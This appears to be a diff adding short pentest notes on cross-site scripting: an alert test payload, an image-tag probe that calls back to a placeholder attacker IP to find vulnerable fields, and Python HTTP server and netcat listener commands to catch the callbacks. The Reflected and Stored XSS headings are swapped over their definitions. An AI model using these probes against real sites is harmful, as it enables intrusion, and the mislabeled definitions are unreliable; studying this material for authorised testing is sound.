@@ -1,0 +1,46 @@
+# Fundamentals
+
+### Reflected XSS
+
+In a persistent XSS attack, the malicious script is stored on the target server (e.g., in a database, message forum, visitor log, or comment field) and is executed in the browser of any user who views the affected page.
+
+### Stored XSS
+
+Reflected XSS attacks occur when an attacker sends a malicious script as part of a request (e.g., in a URL or form submission) that is immediately echoed by the web server in the response and executed in the victim's browser.
+
+```js
+// Test reference
+<script>alert(123)</script>
+```
+
+
+### DOM Based XSS
+
+DOM based XSS attacks involve modifying the DOM environment in the victim's browser, often without any interaction with the server.
+
+### Testing for outbound connections
+
+```js
+// Test reference
+<img src="http://<OUR_IP>/<PARAMETER>"></img>
+```
+
+Where `<PARAMETER>` is replaced with an identifier for whatever input we are currently fuzzing in order to help identify which field turned out to be vulnerable in our request.
+
+**Note:** We can also capture our request in burp to fuzz the `User-Agent` and `Referer` headers before sending it off.
+
+Before sending we also need to setup a Python HTTP server
+
+```bash
+python3 -m http.server 80
+```
+
+This will allow us to capture multiple requests in the case multiple parameters are vulnerable and we need to receive multiple requests.
+
+Once we have an individual request we want to enumerate, we can setup a netcat listener to view the headers associated with it.
+
+```bash
+nc -lvnp 80
+```
+
+If dealing with stored XSS, if no request is made but an error image is still generated, we can still attempt to proceed using filter bypass techniques.
